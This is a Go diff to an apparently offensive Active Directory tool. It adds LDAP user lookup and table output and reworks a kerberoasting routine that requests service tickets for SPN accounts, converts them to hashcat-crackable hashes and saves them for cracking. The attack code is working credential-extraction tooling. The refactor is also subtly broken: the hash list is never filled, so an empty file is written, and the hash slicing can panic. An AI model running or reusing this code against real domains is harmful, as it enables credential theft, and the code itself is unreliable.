@@ -6,6 +6,8 @@ import (
 
 	"github.com/5amu/goad/kerberos"
 	"github.com/5amu/goad/ldap"
+	"github.com/fatih/color"
+	"github.com/rodaine/table"
 )
 
 type LdapOptions struct {
@@ -29,15 +31,16 @@ type LdapOptions struct {
 	} `group:"Hash Retrieval Options" description:"Hash Retrieval Options"`
 
 	Enum struct {
-		TrustedForDelegation bool `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
-		PasswordNotRequired  bool `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
-		PasswordNeverExpires bool `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
-		AdminCount           bool `long:"admin-count" description:"Get objets that had the value adminCount=1"`
-		Users                bool `long:"users" description:"Enumerate enabled domain users"`
-		ActiveUsers          bool `long:"active-users" description:"Enumerate active enabled domain users"`
-		Groups               bool `long:"groups" description:"Enumerate domain groups"`
-		DCList               bool `long:"dc-list" description:"Enumerate Domain Controllers"`
-		GetSID               bool `long:"get-sid" description:"Get domain sid"`
+		TrustedForDelegation bool   `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
+		PasswordNotRequired  bool   `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
+		PasswordNeverExpires bool   `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
+		AdminCount           bool   `long:"admin-count" description:"Get objets that had the value adminCount=1"`
+		Users                bool   `long:"users" description:"Enumerate enabled domain users"`
+		User                 string `long:"user" description:"Find data about a single user"`
+		ActiveUsers          bool   `long:"active-users" description:"Enumerate active enabled domain users"`
+		Groups               bool   `long:"groups" description:"Enumerate domain groups"`
+		DCList               bool   `long:"dc-list" description:"Enumerate Domain Controllers"`
+		GetSID               bool   `long:"get-sid" description:"Get domain sid"`
 	} `group:"Enumeration Options" description:"Enumeration Options"`
 
 	GMSA struct {
@@ -98,6 +101,13 @@ func (o *LdapOptions) Run() (err error) {
 		f = o.enumeration
 	} else if o.Enum.Users {
 		o.filter = ldap.FilterIsUser
+		f = o.enumeration
+
+	} else if o.Enum.User != "" {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NewFilter(ldap.SAMAccountName, o.Enum.User),
+		)
 		f = o.enumeration
 	} else if o.Enum.ActiveUsers {
 		o.filter = ldap.JoinFilters(
@@ -192,7 +202,6 @@ func (o *LdapOptions) kerberoast(target string) error {
 	ldapFilter := ldap.JoinFilters(
 		ldap.FilterIsUser,
 		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-		ldap.NewFilter(ldap.ServicePrincipalName, "*"),
 	)
 	defer lclient.Close()
 
@@ -207,48 +216,71 @@ func (o *LdapOptions) kerberoast(target string) error {
 	}
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-	return lclient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
-		var res []string
-		for _, entry := range users {
-			usr := entry[ldap.SAMAccountName]
-			spn := entry[ldap.ServicePrincipalName]
-			tgs, err := krb5client.GetServiceTicket(usr, spn)
+	tbl := table.New("Module", "Target", "Domain", ldap.SAMAccountName, ldap.ServicePrincipalName, "Hash")
+	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
+
+	var hashes []string
+	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
+		if len(obj.ServicePrincipalName) == 0 {
+			return nil
+		}
+
+		for _, spn := range obj.ServicePrincipalName {
+			tgs, err := krb5client.GetServiceTicket(obj.SAMAccountName, spn)
 			if err != nil {
 				return err
 			}
-			hash := kerberos.TGSToHashcat(tgs.Ticket, usr)
-			res = append(res, hash)
-			fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, usr, spn, hash)
+
+			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
+			tbl.AddRow("LDAP", target, o.Connection.Domain, obj.SAMAccountName, spn, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
 		}
-		if len(res) == 0 {
-			return fmt.Errorf("[%s] no kerberoastable user found on target", target)
-		}
-		return writeLines(res, o.Hashes.Kerberoast)
-	}, ldap.SAMAccountName, ldap.ServicePrincipalName)
+		return nil
+	})
+	if err != nil {
+		return err
+	}
+
+	fmt.Println()
+	tbl.Print()
+	fmt.Printf("\nSaving hashes to '%s'\n\n", o.Hashes.Kerberoast)
+	return writeLines(hashes, o.Hashes.Kerberoast)
 }
 
 func (o *LdapOptions) enumeration(target string) error {
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	defer lclient.Close()
 
-	creds, err := o.authenticate(lclient)
+	_, err := o.authenticate(lclient)
 	if err != nil {
 		return err
 	}
-	return lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
-		_, err := fmt.Printf("[%s]-[%s\\%s]  %s\\%s\n",
-			target, o.Connection.Domain, creds.String(),
-			o.Connection.Domain, obj.SAMAccountName,
+
+	tbl := table.New("Module", "Target", "Domain", ldap.SAMAccountName, ldap.PasswordLastSet, ldap.LastLogon, ldap.ServicePrincipalName)
+	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
+
+	err = lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
+		tbl.AddRow(
+			"LDAP",
+			target,
+			o.Connection.Domain,
+			obj.SAMAccountName,
+			obj.PWDLastSet,
+			obj.LastLogon,
+			obj.ServicePrincipalName,
 		)
 		return err
 	})
+	fmt.Println()
+	tbl.Print()
+	fmt.Println()
+	return err
 }
 
 func (o *LdapOptions) domainSID(target string) error {
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	defer lclient.Close()
 
-	creds, err := o.authenticate(lclient)
+	_, err := o.authenticate(lclient)
 	if err != nil {
 		return err
 	}
@@ -257,6 +289,12 @@ func (o *LdapOptions) domainSID(target string) error {
 	if err != nil {
 		return err
 	}
-	fmt.Printf("[%s]-[%s\\%s:%s] %v\n", target, o.Connection.Domain, creds.Username, creds.Password, sid)
+
+	tbl := table.New("Module", "Target", "Domain", "SID")
+	tbl.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
+	tbl.AddRow("LDAP", target, o.Connection.Domain, sid)
+	fmt.Println()
+	tbl.Print()
+	fmt.Println()
 	return nil
 }
